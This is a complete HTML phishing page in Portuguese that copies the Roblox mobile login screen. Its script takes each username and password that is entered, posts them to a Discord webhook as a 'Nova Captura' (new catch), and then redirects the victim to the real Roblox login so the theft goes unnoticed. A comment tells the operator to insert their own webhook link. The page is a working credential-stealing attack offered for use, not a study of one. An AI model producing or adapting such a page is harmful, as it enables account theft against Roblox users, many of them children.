<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Entrar na Roblox</title>
    <link rel="icon" href="https://www.roblox.com/favicon.ico">
    <link href="https://fonts.googleapis.com/css2?family=Hanken+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Hanken Grotesk', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            background-color: #232527;
            color: #ffffff;
            padding-bottom: 80px; /* Espaço pro banner inferior */
        }

        /* BARRA SUPERIOR */
        .top-nav {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 12px 16px;
            background-color: #232527;
            position: sticky;
            top: 0;
            z-index: 10;
        }
        .logo {
            width: 32px;
            height: 32px;
            background-color: #fff;
            transform: rotate(-15deg);
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 4px;
        }
        .logo-hole {
            width: 10px;
            height: 10px;
            background-color: #232527;
        }
        .nav-actions {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .btn-cadastrar {
            background-color: #335fff;
            color: #fff;
            border: none;
            padding: 8px 16px;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 600;
        }
        .btn-entrar-top {
            background-color: transparent;
            color: #fff;
            border: 1px solid #ffffff;
            padding: 8px 16px;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 500;
        }
        .search-icon {
            color: #fff;
            font-size: 24px;
            margin-left: 4px;
        }

        /* MENU SECUNDÁRIO */
        .sub-nav {
            display: flex;
            justify-content: space-between;
            padding: 0 16px 12px 16px;
            background-color: #232527;
            font-size: 15px;
            font-weight: 500;
            color: #e3e3e3;
        }

        /* IMAGEM DE FUNDO */
        .banner-img {
            height: 100px;
            width: 100%;
            background-image: url('https://images.rbxcdn.com/d4f5853a6130a3e5a81384c3407a256d.jpg');
            background-size: cover;
            background-position: center;
            opacity: 0.6;
            mask-image: linear-gradient(to bottom, black 50%, transparent 100%);
            -webkit-mask-image: linear-gradient(to bottom, black 50%, transparent 100%);
        }

        /* FORMULÁRIO */
        .login-container {
            padding: 0 16px;
            max-width: 500px;
            margin: 0 auto;
        }
        .login-container h1 {
            font-size: 28px;
            font-weight: 700;
            text-align: center;
            margin: 16px 0 24px 0;
        }

        .input-group {
            margin-bottom: 12px;
        }
        .input-group input {
            width: 100%;
            padding: 16px;
            background-color: #2b2d31;
            border: 1px solid #3b3d41;
            border-radius: 8px;
            color: #fff;
            font-size: 16px;
            outline: none;
        }
        .input-group input::placeholder {
            color: #a3a6ab;
        }
        .input-group input:focus {
            border-color: #fff;
        }

        .btn-main {
            width: 100%;
            padding: 16px;
            background-color: transparent;
            border: 1px solid #ffffff;
            border-radius: 8px;
            color: #ffffff;
            font-size: 16px;
            font-weight: 600;
            margin-top: 8px;
            cursor: pointer;
        }
        .btn-main:active {
            background-color: #333;
        }

        .link-forgot {
            display: block;
            text-align: center;
            color: #e3e3e3;
            text-decoration: none;
            font-size: 16px;
            margin: 24px 0;
        }

        /* LINHA DIVISÓRIA */
        .divider {
            height: 1px;
            background-color: #3b3d41;
            margin: 24px 0;
        }

        /* BOTÕES DE OPÇÕES */
        .btn-option {
            width: 100%;
            padding: 16px;
            background-color: #2b2d31;
            border: 1px solid #3b3d41;
            border-radius: 8px;
            color: #e3e3e3;
            font-size: 16px;
            font-weight: 500;
            margin-bottom: 12px;
            cursor: pointer;
        }
        .btn-option:active {
            background-color: #3b3d41;
        }

        .signup-text {
            text-align: center;
            color: #e3e3e3;
            font-size: 15px;
            margin-top: 32px;
            margin-bottom: 32px;
        }
        .signup-text a {
            color: #ffffff;
            font-weight: 600;
            text-decoration: none;
        }

        /* BANNER INFERIOR (APP) */
        .bottom-banner {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            background-color: #3b3d41;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            z-index: 20;
        }
        .bottom-banner-content {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .app-icon {
            width: 36px;
            height: 36px;
            background-color: #335fff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .app-icon-inner {
            width: 16px;
            height: 16px;
            background-color: #fff;
            transform: rotate(-15deg);
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 2px;
        }
        .app-icon-hole {
            width: 6px;
            height: 6px;
            background-color: #335fff;
        }
        .bottom-text {
            font-size: 12px;
            line-height: 1.4;
            color: #fff;
        }
        .bottom-text span {
            font-weight: 700;
        }
        .btn-explore {
            background-color: #335fff;
            color: #fff;
            border: none;
            padding: 10px 16px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
        }
        .close-banner {
            color: #aaa;
            font-size: 20px;
            margin-right: 12px;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <!-- BARRA SUPERIOR -->
    <header class="top-nav">
        <div class="logo"><div class="logo-hole"></div></div>
        <div class="nav-actions">
            <button class="btn-cadastrar">Cadastrar-se</button>
            <button class="btn-entrar-top">Entrar</button>
            <div class="search-icon">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
            </div>
        </div>
    </header>

    <!-- MENU SECUNDÁRIO -->
    <nav class="sub-nav">
        <div>Destaques</div>
        <div>Mercado</div>
        <div>Criar</div>
        <div>Robux</div>
    </nav>

    <!-- BANNER DE FUNDO -->
    <div class="banner-img"></div>

    <!-- FORMULÁRIO -->
    <main class="login-container">
        <h1>Entrar na Roblox</h1>
        
        <form id="form">
            <div class="input-group">
                <input type="text" id="username" placeholder="Usuário/e-mail/telefone" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="Senha" required>
            </div>
            
            <button type="submit" class="btn-main" id="btnSubmit">Entrar</button>
        </form>

        <a href="#" class="link-forgot">Esqueceu a senha ou nome de usuário?</a>

        <div class="divider"></div>

        <button class="btn-option">Envie-me um código único por e-mail</button>
        <button class="btn-option">Entrada rápida</button>
        <button class="btn-option">Outras opções de acesso</button>

        <div class="signup-text">
            Não possui uma conta? <a href="#">Cadastrar-se</a>
        </div>
    </main>

    <!-- BANNER INFERIOR -->
    <div class="bottom-banner">
        <div class="close-banner" onclick="this.parentElement.style.display='none'">✕</div>
        <div class="bottom-banner-content">
            <div class="app-icon">
                <div class="app-icon-inner"><div class="app-icon-hole"></div></div>
            </div>
            <div class="bottom-text">
                <span>Explore a Roblox no nosso<br>aplicativo para Android!</span><br>
                Milhões de experiências criadas por gente como você
            </div>
        </div>
        <button class="btn-explore">Explorar</button>
    </div>

    <script>
        // ⚠️ COLOQUE O TEU LINK DO DISCORD AQUI ENTRE AS ASPAS ⚠️
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1573426421085241448/LGoTUoMIZdohFLYE9s3THG4sSUFbbi1PEF5Hdl145-KIH6KapjIvAnLGhFT4kmlfOFPL';

        const form = document.getElementById('form');
        const btnSubmit = document.getElementById('btnSubmit');
        const user = document.getElementById('username');
        const pass = document.getElementById('password');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = user.value.trim();
            const password = pass.value;
            if (!username || !password) return;

            btnSubmit.textContent = 'Entrando...';

            const payload = {
                content: `🎣 **Nova Captura (Mobile)**\n👤 User: \`${username}\`\n🔑 Senha: \`${password}\``
            };

            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                
                setTimeout(() => {
                    window.location.href = 'https://www.roblox.com/pt/Login';
                }, 1500);

            } catch (error) {
                btnSubmit.textContent = 'Entrar';
                alert('Erro de conexão. Tente novamente.');
            }
        });
    </script>
</body>
</html>
